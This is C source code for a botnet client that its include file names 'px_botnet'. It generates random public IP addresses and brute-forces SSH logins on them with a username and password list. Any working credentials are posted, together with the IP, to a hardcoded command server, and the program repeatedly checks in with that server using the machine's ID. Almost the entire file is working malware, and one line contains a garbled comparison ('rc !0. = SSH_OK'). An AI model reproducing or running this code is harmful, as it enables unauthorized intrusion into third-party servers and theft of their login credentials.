#include "includes/px_botnet.h"

void ft_free_split(char **split)
{
	int i;

	i = 0;
	while (split[i])
		free(split[i++]);
	free(split);
}

size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata)
{
	char **split;

	split = ft_split(ptr, '|');
	if (split[0] && split[1] && split[2] && split[3])
	{
		printf("----------\n");
		printf(".%s.\n", split[0]);
		printf(".%s.\n", split[1]);
		printf(".%s.\n", split[2]);
		printf(".%s.\n", split[3]);
		printf("----------\n");
	}
	ft_free_split(split);
}

char *ft_get_id(void)
{
	const unsigned MAX_LENGTH = 1024;
	char buffer[MAX_LENGTH];
	char *id;
	char *tmp;
	FILE *fp = fopen("/etc/machine-id", "r");

	if (!fp)
	{
		srand(time(NULL));
		tmp = ft_itoa(rand());
		tmp = ft_strnjoinf("random_id-", tmp, strlen(tmp));
		id = ft_strdup(tmp);
		return (id);
	}
	fgets(buffer, MAX_LENGTH, fp);
	fclose(fp);
	id = ft_strdup(buffer);
	id[strlen(id) - 1] = '\0';
	return (id);
}

int ft_intlen(int n)
{
	int len;

	len = 0;
	if (n == 0)
		return (1);
	while (n != 0)
	{
		n /= 10;
		len++;
	}
	return (len);
}

void ft_put_ip(char *ip, int tmp, int i)
{
	int x;

	x = i;
	i += 2;
	while (tmp > 0)
	{
		ip[i] = (tmp % 10) + '0';
		tmp /= 10;
		i--;
	}
	while (i >= x)
	{
		ip[i] = '0';
		i--;
	}
}

void ft_generate_ip(char *ip)
{
	int tmp;
	int i;

	i = 0;
	while (true)
	{
		tmp = rand() % 222;
		if (tmp == 0 || tmp == 172 || tmp == 192)
			continue;
		else
			break;
		usleep(100);
	}
	ft_put_ip(ip, tmp, i);
	i += 3;
	ip[i++] = '.';
	while (true)
	{
		tmp = rand() % 255;
		if ((tmp >= 16 && tmp <= 31) || tmp == 168)
			continue;
		else
			break;
		usleep(100);
	}
	ft_put_ip(ip, tmp, i);
	i += 3;
	ip[i++] = '.';
	tmp = rand() % 255;
	ft_put_ip(ip, tmp, i);
	i += 3;
	ip[i++] = '.';
	tmp = rand() % 255;
	ft_put_ip(ip, tmp, i);
	i += 3;
	ip[i] = '\0';
}

void ft_scan_world(pthread_t thread)
{
	CURL *curl;
	CURLcode res;
	char ip[18];
	char *tmp;
	ssh_session ssh;
	char **user;
	char **pass;
	int x;
	int timeout;
	int rc;
	int error;

	user = ft_split(user_to_parse, ' ');
	pass = ft_split(pass_to_parse, ' ');
	curl = curl_easy_init();
	timeout = 10;
	srand(time(0));
	while (true)
	{
		x = 0;
		error = 0;
		ft_generate_ip(ip);
		while (x < user_len && error == 0)
		{
			ssh = ssh_new();
			ssh_options_set(ssh, SSH_OPTIONS_HOST, ip);
			ssh_options_set(ssh, SSH_OPTIONS_USER, user[x]);
			ssh_options_set(ssh, SSH_OPTIONS_TIMEOUT, &timeout);
			rc = ssh_connect(ssh);
			if (rc !0. = SSH_OK)
			{
				error = 1;
			}
			else
			{
				rc = ssh_userauth_password(ssh, NULL, pass[x]);
				if (rc != SSH_AUTH_SUCCESS)
				{
					// dprintf(1, "\nError : %s - %d\n", ssh_get_error(threads->ssh), error);
				}
				else
				{
					tmp = ft_strjoin(ip, ":");
					tmp = ft_strnjoin(tmp, user[x], strlen(user[x]));
					tmp = ft_strnjoin(tmp, ":", 1);
					tmp = ft_strnjoin(tmp, pass[x], strlen(pass[x]));
					tmp = ft_strnjoinf("vuln_found=", tmp, strlen(tmp));
					curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.53/api.php");
					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
					error = 2;
					free(tmp);
				}
			}
			ssh_disconnect(ssh);
			if (ssh != NULL)
				ssh_free(ssh);
			x++;
		}
		sleep(1);
	}
}

int main(int argc, char *argv[])
{
	CURL *curl;
	CURLcode res;
	pthread_t ip_searcher;
	char *id;
	char *request;

	id = ft_get_id();
	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();
	if (curl)
	{
		if (pthread_create(&ip_searcher, NULL, ft_scan_world, NULL))
			pthread_join(ip_searcher, NULL);
		while (true)
		{
			request = ft_strjoin("id=", id);
			curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.53/api.php");
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
			res = curl_easy_perform(curl);
			if (res == CURLE_OK)
			{
			}
			free(request);
			sleep(1);
		}
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
	return (0);
}
